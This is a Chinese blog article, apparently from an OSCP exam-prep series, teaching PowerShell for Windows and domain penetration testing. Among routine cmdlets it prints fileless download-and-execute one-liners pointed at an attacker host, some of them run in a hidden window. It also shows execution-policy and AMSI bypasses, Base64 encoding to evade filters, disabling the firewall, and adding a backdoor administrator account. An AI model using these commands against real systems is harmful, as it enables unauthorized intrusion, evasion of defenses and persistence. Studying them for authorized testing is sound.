---
title: OSCP百日备考06｜PowerShell 从入门到实战，Windows 靶机与域渗透的核心引擎
url: https://mp.weixin.qq.com/s/DPHvRd98w71LPXJY4UoCwg
source: Doonsec's feed
date: 2026-05-11
fetch_date: 2026-05-12T05:33:44.732385
---

# OSCP百日备考06｜PowerShell 从入门到实战，Windows 靶机与域渗透的核心引擎

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydWezqZ3NXgcicyfXnvJGiabhU1yxcJQBPVRUhxICk26a1dTDfuVt9wDlZB6yKveF4FkVjYPm1gOicFSqaibfajib5uD88boH8iceA6vM/0?wx_fmt=jpeg)

# OSCP百日备考06｜PowerShell 从入门到实战，Windows 靶机与域渗透的核心引擎

泷羽Sec-陌离

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Nw0LxfseydVhkGOCQ9ho3bibWRQ1WM7GWuDXfpLsArKSmQGFbCQDyRB2QuF4k7nDD9xb5ACYxKMlSwOribhmlAA8qB19bNPpObTFvDjdFicIlQ/640?wx_fmt=png&from=appmsg)

前几期我们把 Linux / Windows 基础、网络原理和核心工具都过了一遍，后台收到最多的私信，全是关于 Windows 靶机的卡点。有朋友说，网上抄的 PowerShell 反弹 shell 命令一敲就报错，还有人说远程下载 ps1 脚本总会遇到 “link hit security strategy” 的提示，更别提在 AD 域环境里该怎么高效收集信息，一头雾水。

我自己在备考 OSCP 的时候，也在 PowerShell 上踩过不少坑。曾经觉得它和 cmd 差不多，会几个弹 shell 的命令就行。结果第一次刷 Windows 靶机，就被执行策略、AMSI 拦截和远程下载报错卡了整整一下午，明明漏洞就在眼前，就是拿不到 shell。后来才慢慢悟出来：**PowerShell 不是渗透测试的一个备选项，而是 Windows 渗透和 AD 域环境的核心引擎。**

OSCP 为什么这么看重 PowerShell？道理很简单：

* **系统自带**：从 Windows 7 / Server 2008 R2 开始，PowerShell 就是系统原生组件，不用额外上传工具，更隐蔽。
* **功能强大**：它和 cmd 有本质区别。cmd 只能处理文本，而 PowerShell 是面向对象的，它的输出可以直接被下一条命令处理，信息收集和筛选的效率高出太多。
* **覆盖面广**：从文件操作、信息收集，到提权、反弹 shell、横向移动、域渗透，PowerShell 是能贯穿整个渗透测试生命周期的工具。
* **绕过能力**：面对执行策略、杀毒软件、AMSI 的拦截，PowerShell 有非常多成熟的绕过方案，是突破防护的关键。

今天这篇，我们不讲晦涩的 .NET 原理，只讲 OSCP 考场里你绝对会遇到的核心 PowerShell 技能。从基础概念、高频命令、脚本基础，到必用的执行策略绕过、报错解决和远程执行，全给你拆解得明明白白。

### 一、先划出生死线：PowerShell 的执行策略

新手在 PowerShell 上遇到的第一个坑，基本就是执行策略。你兴冲冲写了个 `.ps1` 脚本，结果双击没反应，或者在控制台里运行直接报错“在此系统上禁止运行脚本”，甚至远程下载时遇到 “link hit security strategy” 的安全拦截。这些问题的根源，都出在执行策略上。

简单来说，执行策略是 PowerShell 的一道安全机制，用来限制脚本在系统上的运行，防止恶意脚本随意执行。但对我们渗透测试来说，这就是一道需要最先突破的防线。

策略类型主要有这几种，你需要知道：

* **Restricted**：这是 **Windows 客户端默认策略**。完全不允许运行任何脚本，只能执行单独的命令。新手最常遇到的就是它。
* **AllSigned**：只允许运行有数字签名的脚本。我们自己写的脚本显然没有签名。
* **RemoteSigned**：这是 **Windows 服务器默认策略**。本地创建的脚本可以直接跑，但从网上下载的脚本必须有签名。你遇到的 “link hit security strategy” 报错，90% 是这个引起的。
* **Unrestricted**：无限制，但下载的脚本运行前会有个提示。
* **Bypass**：完全绕过，没有任何限制和警告，是我们渗透测试最常用的模式。

搞清楚策略之后，关键是怎么绕过去。下面这三个是考场上必用的操作，要在练习时就形成肌肉记忆：

```
# 查看当前执行策略
Get-ExecutionPolicy

# 【考场核心】临时绕过执行策略：仅对当前 PowerShell 进程生效，不修改系统配置，零痕迹
Set-ExecutionPolicy Bypass -Scope Process -Force
```

**给新手的提醒**：考场上，请一定优先用 `-Scope Process` 这个临时绕过方案。它只对当前窗口有效，一旦退出就恢复默认，不会破坏靶机环境，也不会留下明显的操作痕迹，完全符合 OSCP 考试规则。

### 二、OSCP考场必用！PowerShell 核心命令全拆解

![](https://mmbiz.qpic.cn/mmbiz_png/Nw0LxfseydXoAX4E8GIbRfC8N8OH3LYo1Fn0gG5yD6O8q2ge43iaZBJbnAJ6V78OIGYuJcs10icy4pqSdVsibnh3gpMtYuADqm1zcdZo2Ifl2U/640?wx_fmt=png&from=appmsg)

PowerShell 的核心命令叫 **cmdlet**（读作“command-let”），命名规则是 **动词-名词** 固定格式，比如 `Get-Process`，非常容易理解和记忆。记住 `Get`（获取）、`Set`（设置）、`New`（新建）、`Remove`（删除）、`Start`（启动）、`Stop`（停止）这几个动词，80% 的命令基本都能猜出意思了。

下面按渗透测试的实战场景，把考场里最高频的命令都整理出来了。

#### 1. 帮助系统：遇到不会的，考场里直接查

OSCP 考场允许用系统自带帮助，完全没必要死记硬背所有命令，遇到忘了的上 `Get-Help` 就行。

```
# 获取命令帮助
Get-Help Get-Process

# 获取详细帮助和示例
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# 查看所有可用命令
Get-Command
```

#### 2. 文件系统导航：找flag、看配置、传文件

```
Set-Location C:\Windows   # 切换目录 (cd也可)
Get-ChildItem             # 列出文件/文件夹 (dir或ls也可)
Get-ChildItem -Recurse -Force # 递归显示所有文件
New-Item -ItemType Directory -Path C:\Temp # 创建目录
Remove-Item C:\Temp -Recurse -Force # 强制递归删除
Get-Content C:\Temp\flag.txt # 查看内容 (gc也可)
```

#### 3. 进程 & 服务管理：提权、信息收集、关闭防护

```
Get-Process                              # 查看所有进程
Start-Process cmd.exe -WindowStyle Hidden # 隐藏启动进程
Stop-Process -Name notepad -Force        # 停止进程
Get-Service                              # 查看所有服务
Stop-Service -Name Spooler -Force        # 停止服务
```

#### 4. 网络命令：信息收集、反弹shell、横向移动

```
Test-Connection 192.168.1.100 -Count 2  # 测试连通性
Get-NetIPAddress                        # 查看IP配置
Get-NetTCPConnection                    # 查看TCP连接和监听端口
# 【考场常用】关闭所有防火墙配置文件（需管理员权限）
Set-NetFirewallProfile -All -Enabled False
```

#### 5. 用户 & 组管理：提权、创建后门、权限维持

```
Get-LocalUser                                   # 查看本地所有用户
Get-LocalGroupMember -Group "Administrators"    # 查看管理员组成员
New-LocalUser -Name "testuser" -Password (ConvertTo-SecureString "Pass123!@#" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "testuser" # 加入管理员组
Remove-LocalGroupMember -Group "Administrators" -Member "testuser" # 移除用户
```

**小贴士**：PowerShell（`powershell.exe`）和 PowerShell ISE（`powershell_ise.exe`）是两个不同的程序。ISE 是集成脚本编辑环境，有语法高亮和智能提示，当你需要写复杂脚本、制作 payload 时，用它会比直接在控制台里写舒服很多。靶机里默认自带，直接在运行里输入 `powershell_ise.exe` 就能打开。

### 三、PowerShell 脚本编程基础：写payload、自动化必学

在OSCP考场里，不管是写自动化信息收集脚本，还是构造复杂的反弹shell、绕过AMSI的代码，没点脚本编程基础是不行的。

#### 1. 变量与数据类型

变量用 `$` 前缀定义，动态类型，非常灵活。

```
$name = "OSCP"
$portList = 21,22,80,443,4444  # 数组
$userInfo = @{User="admin"; Pass="123456"}  # 哈希表
```

常用的数据类型就是字符串、整数、布尔值 (`$true` / `$false`)、数组和哈希表。这些在写脚本存储端口列表和用户信息时会经常用到。

#### 2. 条件判断与循环

```
# if-else 判断
if ($age -ge 18) { "Adult" }

# foreach 循环 - 渗透最常用
$ipList = "192.168.1.100", "192.168.1.101"
foreach ($ip in $ipList) {
    Test-Connection $ip -Count 1
}

# for 循环
for ($i = 1; $i -le 10; $i++) { $i }
```

`foreach` 是你写脚本时的好伙伴，批量扫端口、批量跑命令时特别好用。

#### 3. 函数定义

把重复使用的代码封装成函数，脚本逻辑会更清晰。下次需要类似功能，直接复用即可。

```
function Test-Port {
    param([string]$IP, [int]$Port)
    # 函数体
}
Test-Port -IP 192.168.1.100 -Port 445
```

### 四、渗透核心！PowerShell 绕过与远程执行技巧

这部分是OSCP考场里的重中之重，也是新手最容易翻车的地方。

#### 1. 远程脚本执行：无文件落地渗透

不用把 ps1 脚本传到靶机，直接在内存中下载并执行，更隐蔽。

```
# 从攻击机下载脚本并内存执行
IEX (New-Object Net.WebClient).DownloadString('http://攻击机IP/script.ps1')

# 简写版
IEX (iwr 'http://攻击机IP/script.ps1').Content
```

**关于 “link hit security strategy” 的几点排查思路：**

1. **执行策略为 RemoteSigned**：需要先执行 `Set-ExecutionPolicy Bypass -Scope Process -Force` 绕过去，再执行下载。
2. **IE增强安全配置（ESC）**：Windows Server 默认会开启，拦截网页下载。可以通过调整 .NET 安全协议或禁用代理来尝试绕过。
3. **网络不通**：可能是靶机防火墙出站规则限制，或者攻击机的 HTTP 服务没开。确保靶机能访问你的 HTTP 服务。

#### 2. 命令行一次性绕过并执行

很多时候我们需要在拿到 webshell 或命令执行漏洞后，直接在 cmd 里调用 PowerShell。这时可以这样做：

```
# 绕过策略运行本地脚本
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\script.ps1

# 绕过策略直接执行远程脚本（一行命令完成无文件落地）
powershell.exe -ExecutionPolicy Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://攻击机IP/script.ps1')"

# 隐藏窗口执行，减少用户感知
powershell.exe -ExecutionPolicy Bypass -W Hidden -C "IEX (New-Object Net.WebClient).DownloadString('http://攻击机IP/script.ps1')"
```

#### 3. Base64 编码命令绕过关键词过滤

如果靶机对 `IEX`、`DownloadString` 等关键词有拦截，可以把整个命令编码成 Base64。

```
powershell.exe -ExecutionPolicy Bypass -EncodedCommand 这里放生成的Base64编码
```

#### 4. PowerShell 远程处理 (WinRM)：横向移动的利器

AD 域渗透里，只要拿到了域内用户的账号密码，且目标主机开了 WinRM（默认端口 5985），就能用 PowerShell 远程处理直接执行命令。

```
# 靶机上启用 PSRemoting（需管理员权限）
Enable-PSRemoting -Force

# 建立交互式远程会话
Enter-PSSession -ComputerName 目标主机名 -Credential (Get-Credential)

# 单次执行命令，不用建立交互式会话
Invoke-Command -ComputerName 目标主机名 -Credential (Get-Credential) -ScriptBlock {
    whoami
}
```

#### 5. AMSI 绕过基础

AMSI（反恶意软件扫描接口）会扫描 PowerShell 脚本内容，常见的反向 shell、mimikatz 等工具都可能被它拦截。其中一个经典、比较稳定的绕过方法是内存修补法：

```
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $Ref.GetField('amsiInitFailed','NonPublic,Static')
$Field.SetValue($null,$true)
```

**严肃提醒**：AMSI 绕过技术仅可用于官方授权的 OSCP 靶场和渗透测试项目。请勿滥用。

### 五、OSCP 备考避坑指南（过来人忠告）

1. **搞清楚原理，别只会抄命令**。许多人背下反弹 shell 的命令却不知其意，换个环境就出错。理解 `-Scope Process` 是做什么的，Base64 编码为什么要用 Unicode，`IEX` 和 `-C` 有什么区别……这样遇到问题才能快速定位，在考场上才不会慌乱。
2. **优先用临时绕过，别乱改靶机全局配置**。记住，\*\*`-Scope Process` 是你的好朋友\*\*。它对当前进程生效，不会修改全局配置，对你的渗透测试来说安全、可靠，还能最大程度避免破坏靶机环境导致丢分。
3. **用好帮助系统，别死记硬背**。PowerShell 的 cmdlet 成百上千，根本记不完。考场上遇到不会的，随时用 `Get-Help` 查官方帮助文档，这是完全合规的操作。
4. **亲手实操，拒绝纸上谈兵**。所有命令、脚本、绕过技巧，都务必在你自己的 Windows 虚拟机里亲手跑一遍。光看是没用的。重点弄一遍我们这次的核心知识点。

### 写在最后

再敲一次警钟：**本文所有的技术内容，仅可用于 OSCP 认证备考和官方授权靶场的学习交流**。未经授权对任何网站、系统进行扫描、攻击、渗透测试，是违法行为。请务必遵守《中华人民共和国网络安全法》等相关法律法规，坚守法律底线。

按照我们的备考计划，从下一期开始，就会正式进入 Web 渗透的核心内容了。我们会从信息收集和指纹识别开始，一步步深入到 SQL 注入、XSS、文件上传、命令注入等 OWASP 核心漏洞的实战解析。不想错过的话，记得**星标公众号**。

在 PowerShell 的学习中，你还遇到过哪些坑？或者有什么独家技巧？欢迎在评论区分享，我们一起交流。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/GOiczibvxk0XROVdRHd20297HPqUe6JxtuibRY8k4292NiaPqHIVPzf4CL3CiafGQAut0nZLWiau48GX68lVVovImbsQ/0?wx_fmt=png)

泷羽Sec-陌离

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像]...